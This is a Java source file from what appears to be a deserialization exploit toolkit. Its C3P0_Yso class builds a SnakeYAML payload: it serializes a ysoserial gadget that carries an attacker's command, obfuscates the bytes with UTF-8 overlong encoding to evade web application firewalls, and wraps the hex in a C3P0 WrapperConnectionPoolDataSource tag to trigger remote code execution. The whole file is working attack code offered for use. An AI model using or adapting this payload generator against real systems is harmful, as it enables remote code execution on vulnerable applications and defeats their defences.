package cn.butler.snakeyaml.payloads;

import cn.butler.payloads.ObjectPayload;
import cn.butler.yso.Serializer;
import cn.butler.yso.UTF8BytesMix;
import cn.butler.payloads.PayloadRunner;
import org.apache.commons.codec.binary.Hex;

public class C3P0_Yso implements ObjectPayload<Object> {

    @Override
    public Object getObject(String command) throws Exception {
        String[] parts = command.split(":", 2);
        String gadget = parts[0];
        String payload = parts[1];
        Object object = ObjectPayload.Utils.makePayloadObject("YsoAttack",gadget, payload);
        //JavaDeserialize UTF-8 Overlong Encoding Bypass WAF
        byte[] serialize = Serializer.serialize(object);
        serialize = new UTF8BytesMix(serialize).builder();
        String hexAscii = Hex.encodeHexString(serialize).toUpperCase();
        String poc = "!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource {\"userOverridesAsString\": \"HexAsciiSerializedMap:" +hexAscii+ ";\"}";
        return poc;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(C3P0_Yso.class, args);
    }
}
